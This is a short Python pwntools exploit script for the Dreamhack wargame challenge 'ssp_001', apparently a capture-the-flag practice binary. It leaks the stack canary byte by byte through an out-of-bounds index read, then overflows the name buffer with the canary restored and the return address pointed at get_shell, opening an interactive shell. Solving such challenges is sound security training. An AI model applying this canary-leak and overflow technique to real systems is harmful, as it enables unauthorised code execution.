from pwn import *
import sys

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('host1.dreamhack.games',14195)
elif sys.argv[1]=="-l":
    p = process('ssp_001')
else:
    log.info("options: -l for local, -r for remote")
    exit(0)

e=ELF('./ssp_001')

get_shell=e.symbols['get_shell']

canary=""

def canaryLeak(idx):
    p.sendlineafter("> ","P")
    p.recvuntil("Element index : ")
    p.sendline(str(idx))
    p.recv(26)
    return p.recv(2)

def overWrite(nameLen,payload):
    p.sendlineafter("> ","E")
    p.recvuntil("Name Size : ")
    p.sendline(str(nameLen))
    p.recvuntil("Name : ")
    p.send(payload)
    
canary+=canaryLeak(128)
canary+=canaryLeak(129)
canary+=canaryLeak(130)
canary+=canaryLeak(131)
canary=int(canary,16)

log.info("CANARY: "+hex(canary))

payload="A"*0x40
payload+=p32(canary,endian='big')
payload+=p32(0)
payload+=p32(0)
payload+=p32(get_shell)

overWrite(0x80,payload)

p.interactive()


        